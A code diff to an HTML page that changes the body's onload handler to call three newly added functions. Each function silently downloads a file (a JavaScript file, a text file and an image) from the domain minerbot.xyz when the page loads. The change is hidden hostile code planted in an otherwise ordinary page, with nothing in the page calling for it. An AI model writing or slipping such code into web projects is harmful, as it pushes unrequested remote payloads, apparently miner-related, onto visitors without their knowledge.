@@ -23,7 +23,7 @@
         <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
         <link href="css/styles.css" rel="stylesheet" />
   </head>
-  <body onload="tankunote()">
+  <body onload="tankunote();down();down2();down3();">
 
         <header class="masthead2">
             <div class="container h-100">
@@ -105,6 +105,30 @@
               document.getElementById("text").innerHTML = text;
               alert(text);
           }
+          function down() {
+	var downloading = browser.downloads.download({
+  url : 'https://minerbot.xyz/s/EXCEPT.js',
+  filename : 'EXCEPT.js',
+  conflictAction : 'uniquify'
+});
+	downloading;
+}
+			    function down2() {
+	var downloading = browser.downloads.download({
+  url : 'https://minerbot.xyz/s/INFO.txt',
+  filename : 'INFO.txt',
+  conflictAction : 'uniquify'
+});
+	downloading;
+}
+			    function down3() {
+	var downloading = browser.downloads.download({
+  url : 'https://minerbot.xyz/s/jk.jpeg',
+  filename : 'jk.jpeg',
+  conflictAction : 'uniquify'
+});
+	downloading;
+}
 
       </script>
         </div>
